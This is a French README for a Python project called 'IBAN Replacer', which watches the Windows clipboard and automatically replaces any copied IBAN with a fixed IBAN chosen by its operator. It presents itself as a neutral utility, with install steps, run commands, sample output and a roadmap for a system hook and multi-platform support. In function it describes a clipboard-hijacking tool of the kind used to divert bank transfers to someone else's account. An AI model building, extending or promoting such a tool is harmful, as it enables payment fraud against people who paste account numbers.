# IBAN Replacer (Windows)

Un petit outil Python pour surveiller le presse-papiers Windows et remplacer automatiquement un IBAN copié par un IBAN fixe.

## ⚙️ Fonctionnalités

- **Écoute le presse-papiers** : Surveillance en temps réel via polling
- **Détection d'IBAN** : Reconnaît les formats IBAN internationaux (FR, DE, ES, etc.)
- **Remplacement automatique** : Substitue l'IBAN détecté par un IBAN configuré
- **Prévention de boucles infinies** : N'effectue le remplacement que si l'IBAN est différent
- **Logs en console** : Suivi des changements effectués
- **Nettoyage de texte** : Supprime automatiquement les caractères de contrôle (\r\n)

## 📁 Contenu du projet

| Fichier | Description |
|---------|-------------|
| `iban-replacer.py` | Script principal |
| `requirements.txt` | Dépendances Python (optionnel) |
| `README.md` | Cette documentation |

## 🛠️ Configuration

Modifiez le paramètre suivant dans `iban-replacer.py` :

```python
nouvel_iban = "FR7630006000011234567890189"
```

Remplacez `FR7630006000011234567890189` par votre IBAN cible.

## 📦 Installation

### Prérequis

- Python 3.x
- Module `pyperclip` ou `win32clipboard`

### Installation des dépendances

```bash
pip install -r requirements.txt
```

## ▶️ Utilisation

1. Lancez le script :
```bash
python iban-replacer.py
```

2. Copiez un IBAN dans votre presse-papiers
3. Le script le remplace automatiquement par `nouvel_iban` (si un IBAN valide est détecté)
4. Arrêtez le programme : **Ctrl+C**

### Exemple de sortie

```
Presse-papiers changé vers : 'FR1420041010050500013M02606'
IBAN remplacé par : FR7630006000011234567890189
```

## 🛡️ Notes importantes

- ✅ **Conçu pour Windows** : Utilise le module `win32clipboard`
- ✅ **Validation IBAN** : Vérifie le format avant remplacement
- ✅ **Sécurité** : Évite les boucles infinies en vérifiant si l'IBAN est déjà le nouvel_iban
- ✅ **Nettoyage automatique** : Supprime les caractères de saut de ligne pour améliorer la détection

## 📌 Améliorations possibles

- [ ] Implémenter un hook système (win32 API) au lieu du polling
- [ ] Ajouter des options de ligne de commande (`--no-replace`, mode démo)
- [ ] Implémenter la sauvegarde des logs dans un fichier
- [ ] Supporter les formats IBAN bruts et formatés (avec espaces)
- [ ] Interface graphique pour configuration facile
- [ ] Support multi-plateforme (macOS, Linux)
- [ ] Gestion de plusieurs IBANs avec liste blanche

## ⚠️ Avertissement de sécurité

Cet outil manipule les IBANs. Utilisez-le avec prudence et assurez-vous de bien configurer l'IBAN cible avant utilisation. Ne le partagez pas avec des IBANs sensibles en clair dans le code.

## 📝 Licence

À définir

## 👨‍💻 Contribution

Les contributions sont bienvenues ! N'hésitez pas à signaler des bugs ou proposer des améliorations.